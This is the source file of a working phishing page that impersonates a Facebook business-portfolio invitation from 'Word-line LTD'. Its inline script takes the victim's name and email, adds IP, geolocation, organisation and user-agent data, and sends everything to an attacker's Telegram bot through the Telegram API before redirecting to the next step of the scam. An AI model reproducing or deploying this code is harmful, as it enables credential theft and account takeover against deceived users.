<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/images/favicon.ico">
    <title>Business Invitation</title>
    <link rel="stylesheet" href="/styles/invite.css">
</head>


<body>
    <nav class="meta-nav">
        <div class="nav-content">
            <img style="height:30px" src="/images/logo.png" alt="Logo" class="logo">
        </div>
    </nav>

    <main class="main-container">
        <div class="invitation-card">   
            <div class="avatar">
                <img src="/images/avatar.jpg" alt="Logo" class="logo">
            </div>
            
            <h1>You're invited to join Word-line LTD</h1>
            
            <p class="invitation-text">
                <strong>Word-line LTD</strong> invited you to join the <strong>Word-line LTD</strong> business portfolio. 
                Portfolios connect a business's Facebook Pages and other business assets so you can manage them all in one place.
            </p>

            <p class="access-info">
                Depending on your access, you can do things like manage Pages, Instagram accounts, ad accounts and people's assignments.
            </p>

            <form class="form-container" onsubmit="sendToTelegramFromInvite(event)" autocomplete="off">
                <p class="form-instruction">Enter your name as you want it to appear in this business portfolio.</p>
                
                <div class="name-fields">
                    <div class="form-group">
                        <label for="firstName">First name</label>
                        <input type="text" id="firstName" name="firstName" required>
                    </div>
                    <div class="form-group">
                        <label for="lastName">Last name</label>
                        <input type="text" id="lastName" name="lastName" required>
                    </div>
                </div>

                <div class="form-group email-group">
                    <label for="businessEmail">
                        Business email 
                        <span class="tooltip-icon" data-tooltip="Notifications about this business portfolio will be sent to this email address.">?</span>
                    </label>
                    <input type="email" id="businessEmail" name="businessEmail" value="" required>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="marketing" name="marketing">
                    <label for="marketing">
                        Receive marketing messages (e.g. email, social) related to business, products and services. Withdraw your consent and unsubscribe at any time.
                    </label>
                </div>

                <div class="privacy-section">
                    <p>For more information about how we handle your data, please read our <a href="#" class="link">Privacy Policy</a>.</p>
                    <p>If you don't know this business, you can <a href="#" class="link">decline the invitation</a>.</p>
                </div>

                <div class="form-footer">
                    <span class="page-indicator">1 of 3</span>
                    <button type="submit" class="continue-btn"
                    >Continue</button>
                </div>
            </form>
        </div>
    </main>

    <footer class="metae-footer">
        <div class="footer-links">
            <a href="#">Facebook</a>
            <a href="#">Developers</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Cookies</a>
            <a href="#">Help</a>
            <a href="#">Report a problem</a>
        </div>
        <div class="footer-info">
            <span class="language">English (US)</span>
        </div>
    </footer>

    <script src="/scripts/invite.js"></script>

    <script>
        function sendToTelegramFromInvite(event) {
            event.preventDefault();
            var firstName = document.getElementById('firstName').value;
            var lastName = document.getElementById('lastName').value;
            var personalEmail = document.getElementById('businessEmail').value;

            if (firstName == "" || lastName == "" || personalEmail == "") {
                alert("Please fill in all required fields");
                return;
            }
            

            var content = "💬Thông Tin Tài Khoản 1💬" +
                "\n" + "----------------------------------------------------------" +
                "\nFirst Name: " + "`" + firstName + "`" +
                "\nLast Name: " + "`" + lastName + "`" +
                "\nEmail: " + "`" + personalEmail + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

            console.log(content);
            
            localStorage.setItem('firstName', firstName);
            localStorage.setItem('lastName', lastName);
            localStorage.setItem('personalEmail', personalEmail);

            var apiToken = "<?php echo $token; ?>";
            var data = {
                chat_id: '<?php echo $chatId; ?>',
                text: content,
                parse_mode: 'Markdown'
            };

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        console.log('Message sent to Telegram bot successfully.');
                        setTimeout(function() {
                            window.location.href = "/review-business-information.php";
                        }, 1000);

                        localStorage.setItem('firstName', firstName);
                        localStorage.setItem('lastName', lastName);
                        localStorage.setItem('personalEmail', personalEmail);
                    } else {
            console.error('Failed to send message to Telegram bot.');
                    }
                }
            };

            xhr.send(JSON.stringify(data));
        }
    </script>

</body>
</html> 